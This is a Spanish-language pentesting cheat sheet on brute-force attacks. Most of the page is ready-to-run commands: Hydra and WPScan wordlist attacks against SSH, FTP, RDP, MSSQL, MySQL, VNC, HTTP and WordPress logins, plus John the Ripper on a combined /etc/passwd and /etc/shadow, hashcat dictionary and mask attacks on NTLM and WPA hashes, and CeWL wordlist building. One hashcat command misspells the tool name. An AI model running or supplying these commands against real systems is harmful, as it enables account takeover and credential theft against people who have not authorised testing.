---
layout: article
title: Pentesting - Fuerza bruta
aside:
  toc: true
sidebar:
  nav: side
header:
  theme: dark
  background: black
---

Existen dos categorías principales de este tipo de ataques, aquellos que se hacen vía internet (**online**) y aquellos en los que no necesitamos realizar peticiones contra el servidor (máquina víctima) para descubrir la contraseña (**offline**), puesto que contamos con la contraseña encriptada/hasheada y tratamos de obtener la contraseña en plano desde nuestra máquina atacante.

<h1>Fuerza bruta vía online</h1>

Limitaciones:
* Sistemas de seguridad.
* Ancho de banda y capacidad de procesamiento (asimilación de la cantidad de peticiones).
* Configuración del servidor.
* Generación de registros en la máquina víctima (no es muy disimulado que digamos...).
* No se tiene control del resultado.

<h2><b>Hydra</b></h2>

<div class="grid" id="ssh-brute">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">SSH</div>
</div>

~~~bash
hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u <IP> ssh -o ssh-creds.txt
hydra -l root -P passwords.txt -t 3 -s port <IP> ssh
~~~

<div class="grid" id="ftp-brute">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">FTP</div>
</div>

~~~bash
hydra -l anonymous -P passwords.txt -v <IP> ftp -o ftp-creds.txt
hydra -L users.txt -P passwords.txt -t 3 -s 21 <IP> ftp
~~~

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">RDP</div>
</div>

~~~bash
hydra -f -l Administrator -P /usr/share/wordlists/rockyou.txt -o rdp-creds.txt rdp://192.168.1.100
~~~

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">MSSQL</div>
</div>

~~~bash
hydra -L /usr/share/wordlists/SecLists/Usernames/mssql-usernames-nansh0u-guardicore.txt -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt 192.168.1.100 mssql -o mssql-creds.txt
~~~

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">MySQL</div>
</div>

~~~bash
hydra -C /usr/share/wordlists/SecLists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt 192.168.1.100 mysql -o mysql-creds.txt
~~~

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">VNC</div>
</div>

~~~bash
hydra -s 5900 -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt -t 1 192.168.1.100 vnc -o vnc-creds.txt
~~~
<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">HTTP - Basic Auth</div>
</div>

~~~bash
hydra -L users.txt -P passwords.txt 192.168.1.100 http-head /webdav/ -o http-creds.txt
~~~

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">HTTP - Tomcat</div>
</div>

~~~bash
hydra -C /usr/share/seclist/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -s 8080 192.168.1.100 http-get /webauth 
~~~

<h2><b>WPScan</b></h2>

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">HTTP</div>
</div>

~~~bash
wpscan --url http://192.168.1.100/wp --passwords=passwords.txt --usernames admin -t 20​
~~~

<h1>Fuerza bruta vía offline</h1>

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">John the Ripper</div>
</div>

Cracking de contraseñas en sistemas linux:

~~~bash
unshadow /etc/passwd /etc/shadow > unshadow.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --fork=20 unshadow.txt
~~~

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">Hashcat</div>
</div>

~~~bash
hashcat -m <tipo> <hashes> <diccionario>
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt # Diccionario
hashcat -m 1000 hashes.txt -a3 "?u?l?l?l?d?d?d?D" # Máscara
hashcar -O -w3 -m 2500 wpa.hccapx /usr/share/wordlists/rockyou.txt # "-O -w3" Aumentan la velocidad, pero consumen casi la totalidad de los recursos del sistema
~~~

<h1>Generación de diccionarios</h1>

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">CeWL</div>
</div>
[https://github.com/digininja/CeWL.git](https://github.com/digininja/CeWL.git)

Generador de wordlists que recopila palabras clave de las URL del objetivo (spider del objetivo). Esta lista puede ser utilizada como diccionario para logins en aplicaciones web.

~~~bash
./cewl example.com -d 1 -w example-keywords.txt
~~~